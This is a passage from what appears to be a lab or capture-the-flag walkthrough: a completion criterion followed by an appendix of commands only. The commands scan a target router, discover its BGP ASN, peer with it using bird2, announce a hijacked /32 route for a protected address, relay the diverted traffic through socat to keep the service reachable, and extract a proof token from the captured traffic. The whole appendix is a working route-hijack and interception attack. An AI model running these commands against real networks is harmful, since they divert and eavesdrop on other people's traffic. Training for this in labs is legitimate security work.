| **Challenge completion:** The attack is complete only when the /32 is exported, protected traffic is observed on Kali, the application remains reachable through the relay, and the raw rotating proof is extracted from the live traffic. |

# **Appendix A - Condensed Command Sequence**

This appendix is a command-only reference. Use the detailed steps above for explanation, expected effects and troubleshooting.

> TARGET="203.0.0.251"\
> KALI_INTERFACE="wg0"\
> ATTACKER_ASN="65250"\
> KALI_IP="\$(ip -4 -o address show dev "\$KALI_INTERFACE" \| awk 'NR==1 {split(\$4,a,"/"); print a\[1\]}')"\
> \
> sudo nmap -n -Pn -sT --open -p 179,18000-19100 "\$TARGET"\
> \
> \# Create /tmp/discover_bgp_asn.py using Step 3, then:\
> EDGE_ASN="\$(sudo python3 /tmp/discover_bgp_asn.py "\$TARGET" "\$KALI_IP" \| sed -n 's/^EDGE_ASN=//p')"\
> test -n "\$EDGE_ASN" \|\| { echo "EDGE ASN discovery failed" \>&2; exit 1; }\
> echo "EDGE_ASN=\$EDGE_ASN"\
> \
> sudo apt-get update\
> sudo apt-get install -y bird2 socat tcpdump\
> \
> cat \>/tmp/vyos-red.conf \<\<EOF\
> log "/tmp/vyos-red-bird.log" all;\
> router id \${KALI_IP};\
> protocol device {}\
> protocol bgp vyos {\
> local as \${ATTACKER_ASN};\
> neighbor \${TARGET} as \${EDGE_ASN};\
> source address \${KALI_IP};\
> multihop 8;\
> ipv4 { import all; export none; };\
> }\
> EOF\
> \
> sudo bird -p -c /tmp/vyos-red.conf\
> sudo bird -c /tmp/vyos-red.conf -s /tmp/vyos-red.ctl -P /tmp/vyos-red.pid\
> sleep 5\
> sudo birdc -s /tmp/vyos-red.ctl show protocols all vyos\
> sudo birdc -s /tmp/vyos-red.ctl show route protocol vyos all\
> \
> sudo nohup socat -v TCP-LISTEN:\${PROTECTED_PORT},bind=\${KALI_IP},reuseaddr,fork TCP:\${TARGET}:\${BACKEND_PORT} \>/dev/null 2\>/tmp/vyos-kali-relay.log &\
> \
> sudo ip address add \${PROTECTED_VIP}/32 dev lo 2\>/dev/null \|\| true\
> \
> cat \>/tmp/vyos-red.conf \<\<EOF\
> log "/tmp/vyos-red-bird.log" all;\
> router id \${KALI_IP};\
> protocol device {}\
> protocol direct protected_vip { ipv4; interface "lo"; }\
> filter export_hijack {\
> if net = \${PROTECTED_VIP}/32 then accept;\
> reject;\
> }\
> protocol bgp vyos {\
> local as \${ATTACKER_ASN};\
> neighbor \${TARGET} as \${EDGE_ASN};\
> source address \${KALI_IP};\
> multihop 8;\
> ipv4 { import all; export filter export_hijack; };\
> }\
> EOF\
> \
> sudo bird -p -c /tmp/vyos-red.conf\
> sudo birdc -s /tmp/vyos-red.ctl configure\
> sleep 5\
> sudo birdc -s /tmp/vyos-red.ctl show route export vyos all\
> sudo birdc -s /tmp/vyos-red.ctl show protocols all vyos\
> \
> grep -aEo 'X-Route-Proof:\[\[:space:\]\]\*proof-\[A-Za-z0-9.\_:-\]+' /tmp/vyos-kali-relay.log \| tail -n1 \| sed -E 's/^X-Route-Proof:\[\[:space:\]\]\*//'

